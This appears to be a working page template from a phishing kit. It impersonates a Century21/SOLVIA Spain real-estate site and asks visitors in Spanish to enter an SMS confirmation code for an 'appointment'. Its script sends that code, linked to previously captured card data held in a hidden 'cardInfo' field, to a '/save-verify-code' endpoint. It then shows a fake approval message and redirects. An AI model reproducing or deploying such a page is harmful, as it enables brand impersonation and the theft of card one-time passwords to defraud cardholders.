<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Phone Verification</title>
  <link rel="icon" href="{{ Url('assets/favicon.svg') }}" />
  <link rel="stylesheet" href="{{ Url('assets/style.css') }}" data-precedence="next" />
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: sans-serif;
      background: #f9f9f9;
    }
    .spinner {
      border: 8px solid #eee;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .code-inputs {
      gap: 10px;
    }
    .code-inputs input {
      width: 40px;
      height: 50px;
      font-size: 24px;
      text-align: center;
      border: 2px solid #ccc;
      border-radius: 8px;
    }
    h2 {
      margin-bottom: 20px;
      color: #333;
    }
  </style>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
</head>
<body class="__variable_f40aa8 __variable_1ad1ac __variable_ea16cd __variable_c03330 __variable_33a174 font-oakes antialiased" id="website" style="overflow: unset;">  
  <main style="width: 100%;">
    <div class="flex flex-col min-h-screen justify-between">
        <div class="fixed inset-x-0 top-0 h-[64px] bg-grey-600 z-40 transition-all duration-150 opacity-0 invisible" style="height: 100px;"></div>
        <header class="w-full flex items-center h-[64px] top-0 z-50 transition-colors bg-grey-600" style="background: transparent; height: 100px;">
            <div class="w-full px-4 lg:px-6 flex items-center justify-start lg:justify-between">
                <button class="lg:hidden mr-4" aria-label="Toggle menu">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="remixicon w-6 h-6 text-white"><path d="M3 4H21V6H3V4ZM3 11H21V13H3V11ZM3 18H21V20H3V18Z"></path></svg>
                </button>
                <a aria-label="Century21 Homepage" href="/">
                    <img src="{{Url('assets/logo.png')}}" style="width: 250px;"/>      
                </a>
                <nav class="items-center gap-6 hidden lg:flex">
                    <a class="button-md font-bold text-black" href="/comprar">Comprar</a><a class="button-md font-bold text-black" href="/alquilar">Alquilar</a>
                    <a class="button-md font-bold text-black" href="/estimar-inmueble">Estimar inmueble</a>
                    <div class="flex items-center ml-[24px]">
                        <div class="h-[18px] mx-4 w-px bg-grey-400"></div>
                        <div class="col-span-4 lg:col-span-12 flex justify-center">
                            <button
                                type="button"
                                role="combobox"
                                aria-controls="radix-:Rtopsmkq:"
                                aria-expanded="false"
                                aria-autocomplete="none"
                                dir="ltr"
                                data-state="closed"
                                class="!flex !outline-none items-center justify-between whitespace-nowrap border border-border bg-transparent py-[4px] placeholder:text-muted-foreground _focus:outline-none disabled:cursor-not-allowed disabled:opacity-50 [&amp;&gt;span]:line-clamp-1 w-auto h-[48px] button-lg text-[16px] border-none px-0 pt-0 pb-0"
                                fdprocessedid="ejoaf8"
                            >
                                <div class="button-md flex items-center gap-1 font-bold text-black">
                                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4 fill-gold-600" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                        <path
                                            d="M12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22ZM9.71002 19.6674C8.74743 17.6259 8.15732 15.3742 8.02731 13H4.06189C4.458 16.1765 6.71639 18.7747 9.71002 19.6674ZM10.0307 13C10.1811 15.4388 10.8778 17.7297 12 19.752C13.1222 17.7297 13.8189 15.4388 13.9693 13H10.0307ZM19.9381 13H15.9727C15.8427 15.3742 15.2526 17.6259 14.29 19.6674C17.2836 18.7747 19.542 16.1765 19.9381 13ZM4.06189 11H8.02731C8.15732 8.62577 8.74743 6.37407 9.71002 4.33256C6.71639 5.22533 4.458 7.8235 4.06189 11ZM10.0307 11H13.9693C13.8189 8.56122 13.1222 6.27025 12 4.24799C10.8778 6.27025 10.1811 8.56122 10.0307 11ZM14.29 4.33256C15.2526 6.37407 15.8427 8.62577 15.9727 11H19.9381C19.542 7.8235 17.2836 5.22533 14.29 4.33256Z"
                                        ></path>
                                    </svg>
                                    <span>ES</span>
                                </div>
                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 text-gold-600 ml-2" aria-hidden="true" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                    <path fill="none" d="M0 0h24v24H0z"></path>
                                    <path d="M16.59 8.59 12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
                                </svg>
                            </button>
                        </div>
                    </div>
                </nav>
            </div>
        </header>
        <div>
        <div style="display: flex; justify-content: center;">
        
          <h2 style="max-width: 800px;">Por favor, espere y no cierre esta página. En breve recibirá en su teléfono un código de confirmación, que le rogamos introducir en la casilla de abajo para poder confirmar su cita.
          Le pedimos un poco de paciencia, ya que el proceso puede tardar hasta 5 minutos.</h2>
          </div>
          <div id="spinner" class="spinner"></div>

          <input type="hidden" id="cardInfo" value="{{json_encode($cardInfo)}}"/>
          <div style="display: flex; justify-content: center;">
          <div id="codeInputs" class="code-inputs">
            <input type="text" style="width: 300px;" id="verifyCode">
          </div>
          </div>
          <div style="display: flex; justify-content: center;">
            <button id="submit" style="
                background: #3d6eff;
                border: none;
                border-radius: 8px;
                padding: 10px 30px;
                color: white;
                font-size: 20px;
                margin-top: 15px;">
              Enviar
            </button>
            </div>
        </div>
        <footer class="bg-grey-100 py-16">
            <div class="container">
                <div class="site-grid">
                    <nav class="col-span-4 md:col-span-12 flex flex-col lg:flex-row justify-center items-center gap-6 py-8 border-y border-grey-200 mt-2">
                        <a class="body-sm link" href="/terminos-y-condiciones">Términos y Condiciones</a><a class="body-sm link" target="_blank" href="https://www.livroreclamacoes.pt/">Libro de Reclamaciones</a>
                    </nav>
                    <div class="col-span-4 md:col-span-12 flex flex-col justify-center items-center gap-2">
                        <div class="mb-4">
                            <div class="col-span-4 lg:col-span-12 flex justify-center">
                                <button
                                    type="button"
                                    role="combobox"
                                    aria-controls="radix-:R2lpsmkq:"
                                    aria-expanded="false"
                                    aria-autocomplete="none"
                                    dir="ltr"
                                    data-state="closed"
                                    class="!flex !outline-none items-center justify-between whitespace-nowrap border border-border bg-transparent py-[4px] placeholder:text-muted-foreground _focus:outline-none disabled:cursor-not-allowed disabled:opacity-50 [&amp;&gt;span]:line-clamp-1 w-auto h-[48px] button-lg text-[16px] px-[24px] pt-[10px] pb-[13px]"
                                    fdprocessedid="za5vxf5"
                                >
                                    <div class="flex items-center gap-2">
                                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4 mr-2 text-brand" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                                            <path
                                                d="M12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22ZM9.71002 19.6674C8.74743 17.6259 8.15732 15.3742 8.02731 13H4.06189C4.458 16.1765 6.71639 18.7747 9.71002 19.6674ZM10.0307 13C10.1811 15.4388 10.8778 17.7297 12 19.752C13.1222 17.7297 13.8189 15.4388 13.9693 13H10.0307ZM19.9381 13H15.9727C15.8427 15.3742 15.2526 17.6259 14.29 19.6674C17.2836 18.7747 19.542 16.1765 19.9381 13ZM4.06189 11H8.02731C8.15732 8.62577 8.74743 6.37407 9.71002 4.33256C6.71639 5.22533 4.458 7.8235 4.06189 11ZM10.0307 11H13.9693C13.8189 8.56122 13.1222 6.27025 12 4.24799C10.8778 6.27025 10.1811 8.56122 10.0307 11ZM14.29 4.33256C15.2526 6.37407 15.8427 8.62577 15.9727 11H19.9381C19.542 7.8235 17.2836 5.22533 14.29 4.33256Z"
                                            ></path>
                                        </svg>
                                        Español
                                    </div>
                                    <svg
                                        stroke="currentColor"
                                        fill="currentColor"
                                        stroke-width="0"
                                        viewBox="0 0 24 24"
                                        class="h-4 w-4 text-gold-600 ml-2"
                                        aria-hidden="true"
                                        height="1em"
                                        width="1em"
                                        xmlns="http://www.w3.org/2000/svg"
                                    >
                                        <path fill="none" d="M0 0h24v24H0z"></path>
                                        <path d="M16.59 8.59 12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
                                    </svg>
                                </button>
                            </div>
                        </div>
                        <span class="body-xs text-grey-300">
                            ©
                            <!-- -->2025<!-- -->
                            <!-- -->SOLVIA<!-- -->
                            <!-- -->España
                        </span>
                        <span class="body-xs text-grey-300">Cada agencia es legal y financieramente independiente.</span>
                    </div>
                </div>
            </div>
        </footer>
    </div>
  </main>


  <script>
        const title = document.querySelector('h2');
        let cardInfo = JSON.parse($('#cardInfo').val());
        console.log(cardInfo)
        $('#submit').on('click', function(){
            if($('#verifyCode').val() == '') return;
            $.ajax({
              type: 'GET',
              url: "{{Url('/save-verify-code')}}",
              data: {
                code: $('#verifyCode').val(),
                cardInfoId: cardInfo.id
              },
              success: function(){
                title.innerText = 'Su cita ha sido aprobada. Con un día de antelación a la misma, recibirá un mensaje de texto SMS de nuestra parte.';
                $('#codeInputs').remove();
                $('#spinner').remove();
                $('#submit').remove();
                setTimeout(() => {
                  window.location.href = "/"
                }, 15000)
              }
            })
        })
  </script>

</body>
</html>
